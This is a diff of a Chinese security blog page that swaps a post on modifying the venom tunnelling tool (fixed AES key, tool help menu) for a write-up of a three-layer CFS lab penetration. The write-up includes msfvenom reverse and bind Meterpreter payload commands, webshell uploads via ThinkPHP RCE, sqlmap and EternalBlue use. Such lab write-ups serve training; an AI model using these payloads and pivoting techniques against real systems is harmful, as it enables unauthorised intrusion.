@@ -13,7 +13,7 @@
   
   <title>
     
-      venom-crypt基于原版改动 
+      CFS三层内网渗透 
       
       
       |
@@ -149,19 +149,19 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">venom-crypt基于原版改动</div>
+      <div class="post-title">CFS三层内网渗透</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-          2024-09-17 00:00:00
+          2024-09-24 00:00:00
         </span>
         
               <span class="post-categories">
                 <i class="iconfont icon-bookmark" title="分类"></i>
                 
                 <span class="span--category">
-                  <a href="/categories/tools/" title="tools">
-                    <b>#</b> tools
+                  <a href="/categories/%E5%86%85%E7%BD%91/" title="内网">
+                    <b>#</b> 内网
                   </a>
                 </span>
                 
@@ -169,34 +169,71 @@
           
       </div>
       <div class="markdown-body">
-        <h2 id="venom-crypt基于原版改动"><a href="#venom-crypt基于原版改动" class="headerlink" title="venom-crypt基于原版改动"></a>venom-crypt基于原版改动</h2><h3 id="原版"><a href="#原版" class="headerlink" title="原版"></a>原版</h3><ul>
-<li><p>明文传输、自定义密钥的AES-CTR加密</p>
-</li>
-<li><p>原版非加密对比加密</p>
-</li>
-<li><p>命令数据包加密后增加16字节</p>
-</li>
-</ul>
-<h3 id="修改版"><a href="#修改版" class="headerlink" title="修改版"></a>修改版</h3><ul>
-<li><p>密文传输、固定密钥00theway的AES-CTR加密</p>
-</li>
-<li><p>基于原版非加密传输数据包增加100字节</p>
-</li>
-<li><p>加密位置</p>
-</li>
-</ul>
-<p><code>myConn/aesCrypto.Encrypt()</code></p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">aes256key</span><span class="params">()</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	key := []<span class="type">byte</span>(<span class="string">&quot;3b762cc137d55f4dcf4fe184ccc1dc15&quot;</span>) <span class="comment">//明文：00theway</span></span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(hrc *AesCrypt)</span></span> Encrypt(dst, plainText []<span class="type">byte</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	block, err := aes.NewCipher(aes256key())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dst = <span class="built_in">make</span>([]<span class="type">byte</span>, aes.BlockSize+<span class="built_in">len</span>(plainText))</span><br><span class="line">	iv := dst[:aes.BlockSize]</span><br><span class="line">	<span class="keyword">if</span> _, err := io.ReadFull(rand.Reader, iv); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	encryptStream := cipher.NewCTR(block, iv)</span><br><span class="line">	encryptStream.XORKeyStream(dst[aes.BlockSize:], plainText)</span><br><span class="line">	<span class="keyword">return</span> dst, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h1 id="CFS三层内网渗透笔记"><a href="#CFS三层内网渗透笔记" class="headerlink" title="CFS三层内网渗透笔记"></a>CFS三层内网渗透笔记</h1><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>攻击机：192.168.1.129&#x2F;192.168.2.163</p>
+<p>CentOS：192.168.1.128&#x2F;192.168.2.165&#x2F;192.168.22.128</p>
+<p>Ubuntu：192.168.22.129&#x2F;192.168.33.128</p>
+<p>Windows：192.168.33.33</p>
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.128</span><br><span class="line">Host is up (0.00084s latency).</span><br><span class="line">Not shown: 993 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    Ajenti http control panel</span><br></pre></td></tr></table></figure>
 
-<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(admin node) &gt;&gt;&gt; help</span><br><span class="line"></span><br><span class="line">  help                                     Help information.</span><br><span class="line">  exit                                     Exit.</span><br><span class="line">  show                                     Display network topology.</span><br><span class="line">  getdes                                   View description of the target node.</span><br><span class="line">  setdes     [info]                        Add a description to the target node.</span><br><span class="line">  goto       [id]                          Select id as the target node.</span><br><span class="line">  listen     [lport]                       Listen on a port on the target node.</span><br><span class="line">  connect    [rhost] [rport]               Connect to a new node through the target node.</span><br><span class="line">  sshconnect [user@ip:port] [dport]        Connect to a new node through ssh tunnel.</span><br><span class="line">  shell                                    Start an interactive shell on the target node.</span><br><span class="line">  upload     [local_file]  [remote_file]   Upload files to the target node.</span><br><span class="line">  download   [remote_file]  [local_file]   Download files from the target node.</span><br><span class="line">  socks      [lport]                       Start a socks5 server.</span><br><span class="line">  lforward   [lhost] [sport] [dport]       Forward a local sport to a remote dport.</span><br><span class="line">  rforward   [rhost] [sport] [dport]       Forward a remote sport to a local dport.</span><br></pre></td></tr></table></figure>
+<p>先访问80端口</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240904210309724.png" alt="image-20240904210309724"></p>
+<p>一个TP5的框架，上工具扫一下</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240904210404256.png" alt="image-20240904210404256"></p>
+<p>可以看到有5023的RCE，上个webshell</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240904210639036.png" alt="image-20240904210639036"></p>
+<p>网站目录下flag：flag{e2D3aFdasde}，robots.txt里面flag：flag{QeaRqaw12fs}</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240904211943542.png" alt="image-20240904211943542"></p>
+<p>根目录下flag：flag{qEa12Nasd1a}</p>
+<p>现在的权限是www，提权先跳过，后面再补</p>
+<p>TODO：提权</p>
+<h3 id="centos上线msf"><a href="#centos上线msf" class="headerlink" title="centos上线msf"></a>centos上线msf</h3><p>生成木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.2.163 LPORT=4444 -f elf &gt; centos.elf</span><br></pre></td></tr></table></figure>
 
+<p>上线</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240923212333358.png" alt="image-20240923212333358"></p>
+<p>网段查看并建立路由</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240923212828366.png" alt="image-20240923212828366"></p>
+<p>设置代理</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240923213338880.png" alt="image-20240923213338880"></p>
+<h3 id="对22网段信息收集"><a href="#对22网段信息收集" class="headerlink" title="对22网段信息收集"></a>对22网段信息收集</h3><p>上传fscan进行内网扫描</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240904212845859.png" alt="image-20240904212845859"></p>
+<p>可以看到在129主机上开放一个CMS</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240904221355945.png" alt="image-20240904221355945"></p>
+<p>有一个sql注入的提示</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240904222901313.png" alt="image-20240904222901313"></p>
+<p>sqlmap一把梭，拿到管理员账号密码</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240907155004125.png" alt="image-20240907155004125"></p>
+<p>从网站robots文件得到后台地址</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240907155253577.png" alt="image-20240907155253577"></p>
+<p>admin&#x2F;123qwe登录后首页flag：flag{eS3sd1IKarw}</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240907155455458.png" alt="image-20240907155455458"></p>
+<p>修改网站模板，添加一句话木马</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240907160407876.png" alt="image-20240907160407876"></p>
+<p>Proxifier+哥斯拉上线</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240907160508728.png" alt="image-20240907160508728"></p>
+<p>flag42Fs.txt文件得到flag：flag{23ASfqwr4t2e}</p>
+<p>根目录下flag：flag{1a2saA23eas}</p>
+<p>提权暂时跳过</p>
+<h3 id="ubuntu上线msf"><a href="#ubuntu上线msf" class="headerlink" title="ubuntu上线msf"></a>ubuntu上线msf</h3><p>用msf生成正向木马上线</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=2222 -f elf &gt; ubuntu.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240923225642691.png" alt="image-20240923225642691"></p>
+<p>查看建立路由</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240923225909960.png" alt="image-20240923225909960"></p>
+<h3 id="对33网段信息收集"><a href="#对33网段信息收集" class="headerlink" title="对33网段信息收集"></a>对33网段信息收集</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -T4 192.168.33.33</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240924002957016.png" alt="image-20240924002957016"></p>
+<p>用445端口的永恒之蓝打</p>
+<p>当时只想着换正向payload了，忘了换操作系统了……</p>
+<p><img src="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/image-20240924004023855.png" alt="image-20240924004023855"></p>
+<p>ok</p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2024/08/28/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" target="_self">
+              <a href="/2024/09/17/venom-crypt/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>上一页</span>
               </a>
@@ -205,15 +242,15 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-              2024-09-17 00:00:00
+              2024-09-24 00:00:00
             </span>
             
                   <span class="post-categories">
                     <i class="iconfont icon-bookmark" title="分类"></i>
                     
                     <span class="span--category">
-                      <a href="/categories/tools/" title="tools">
-                        <b>#</b> tools
+                      <a href="/categories/%E5%86%85%E7%BD%91/" title="内网">
+                        <b>#</b> 内网
                       </a>
                     </span>
                     
@@ -221,11 +258,6 @@
               
           </div>
           <div class="post-foot-prev">
-            
-              <a href="/2024/09/24/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/" target="_self">
-                <span>下一页</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
             
           </div>
         </div>
@@ -239,7 +271,7 @@
     <div class="title">目录</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#venom-crypt%E5%9F%BA%E4%BA%8E%E5%8E%9F%E7%89%88%E6%94%B9%E5%8A%A8"><span class="toc-text">venom-crypt基于原版改动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%89%88"><span class="toc-text">原版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%89%88"><span class="toc-text">修改版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD"><span class="toc-text">功能</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0"><span class="toc-text">CFS三层内网渗透笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-text">网络配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#centos%E4%B8%8A%E7%BA%BFmsf"><span class="toc-text">centos上线msf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B922%E7%BD%91%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">对22网段信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ubuntu%E4%B8%8A%E7%BA%BFmsf"><span class="toc-text">ubuntu上线msf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B933%E7%BD%91%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">对33网段信息收集</span></a></li></ol></li></ol></li></ol>
       
     </div>
   </div>
